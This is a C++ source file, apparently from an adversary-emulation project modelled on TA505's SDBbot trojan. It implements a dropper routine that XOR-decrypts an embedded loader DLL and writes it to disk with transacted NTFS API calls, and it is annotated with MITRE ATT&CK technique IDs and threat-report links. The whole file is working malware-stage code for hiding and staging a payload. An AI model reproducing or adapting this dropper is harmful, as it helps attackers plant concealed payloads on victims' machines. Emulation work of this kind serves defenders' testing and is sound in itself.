#include "drop.hpp"
#include "loader.dll.hpp" // embedded::loader
#include "files.hpp"
#include "transactions.hpp"
#include "xor.hpp"

using common::windows_error;
using std::expected, std::unexpected;
using std::filesystem::path, std::wstring_view, std::span;

/*
 * drop_loader:
 *      About:
 *          Drops the embedded loader DLL to the specified location on disk using the
 *          CreateFileTransactedW, WriteFile, and CommitTransaction API calls.
 *      Result:
 *          Loader DLL written to specified path.
 *      MITRE ATT&CK Techniques:
 *          T1027.009: Obfuscated Files or Information: Embedded Payloads
 *          T1106: Native API
 *      CTI:
 *          https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader
 *          https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/
 */
expected<void, windows_error>
drop_loader(const std::filesystem::path& path) {
    auto transaction = common::create_transaction();
    if (!transaction) {
        return std::unexpected(transaction.error());
    }

    // Make writeable copy of embedded:loader to XOR-decrypt it
    std::vector<unsigned char> loader_dec(embedded::loader.begin(), embedded::loader.end());
    xor_crypt::XorInPlace(loader_dec.data(), loader_dec.size(), xor_crypt::XorKeyBytes);

    auto write = common::write_file(
        transaction.value().get(),
        loader_dec,
        path.c_str()
    );
    if (!write) {
        return std::unexpected(write.error());
    }

    auto commit = common::commit_transaction(transaction.value().get());
    if (!commit) {
        return std::unexpected(commit.error());
    }

    return {};
}
